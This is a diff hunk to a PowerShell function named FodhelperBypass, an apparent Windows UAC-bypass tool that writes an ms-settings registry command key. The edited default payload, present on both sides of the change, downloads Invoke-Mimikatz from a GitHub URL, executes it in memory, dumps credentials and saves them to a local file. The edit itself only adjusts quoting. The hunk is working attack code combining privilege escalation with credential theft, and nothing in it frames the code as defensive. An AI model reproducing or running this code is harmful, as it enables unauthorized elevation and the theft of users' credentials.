@@ -24,7 +24,7 @@
 function FodhelperBypass(){ 
  Param (
            
-        [String]$program = """cmd.exe /c powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds | Out-File -FilePath 'C:\PSTest.txt'""" #default
+        [String]$program = ""cmd.exe /c powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds | Out-File -FilePath 'C:\PSTest.txt'""" #default
        )
     #Create registry structure
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
